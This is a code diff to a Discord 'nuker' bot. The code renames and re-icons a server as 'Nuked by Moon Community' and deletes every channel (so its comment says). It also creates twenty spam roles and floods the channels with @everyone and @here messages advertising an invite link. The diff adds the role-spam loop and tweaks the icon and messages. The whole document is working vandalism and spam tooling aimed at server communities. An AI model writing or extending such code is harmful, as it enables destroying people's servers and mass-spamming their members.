@@ -36,7 +36,7 @@ module.exports = (client) => {
                 // 1.1 Server Details Change
                 await guild.setName("Nuked by Moon Community 🌙").catch(() => {});
                 await guild.setIcon(
-                    "https://cdn.discordapp.com/attachments/1531280455553388564/1556007534551371776/519nH38DWOL._AC_UF8941000_QL80_.jpg?backend=b2&ex=6ac29871&is=6ac146f1&hm=f78a05a105d4e1b0b48cd263fe0af374c40161823702edf73e853c8f1bb09465&"
+                    "https://cdn.discordapp.com/attachments/1560933166716428299/1561008115628113970/IMG_fe34a356-623c-4c8f-9015-d7ed804bf08a.jpg?ex=6ad4c998&is=6ad37818&hm=aeefd3bb5b5b7c626f173e73b666314906ca046eda3bfbef5006f5f34155cdd3&"
                 ).catch(() => {});
                 
                 // 2. Delete all existing channels
@@ -170,13 +170,25 @@ module.exports = (client) => {
                     }
                 }
 
+                // 9. Create new roles
+                const newRoles = [];
+                for (let i = 0; i < 20; i++) {
+                    const role = await guild.roles.create({
+                        name: "moon community annoucers 📢",
+                        type: RoleType.GuildText
+                    }).catch(() => null);
+
+                    if (role) {
+                        newRoles.push(role);
+                    }
+                }
+
                 // 5. Send initial message
                 const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/62xxMq2NKv";
                 await Promise.all(
                     newChannels.map(channel =>
                         channel.send({
-                            content: welcomeMessage,
-                            embeds: [{ image: { url: BANNER_URL } }]
+                            content: welcomeMessage
                         }).catch(() => {})
                     )
                 );
@@ -209,7 +221,7 @@ module.exports = (client) => {
             if (welcomeInterval) {
                 clearInterval(welcomeInterval);
                 welcomeInterval = null;
-                await message.channel.send("🛑 Spammer band kar diya gaya.").catch(() => {});
+                await message.channel.send("🛑 nuke stoped.").catch(() => {});
             }
         }
     });
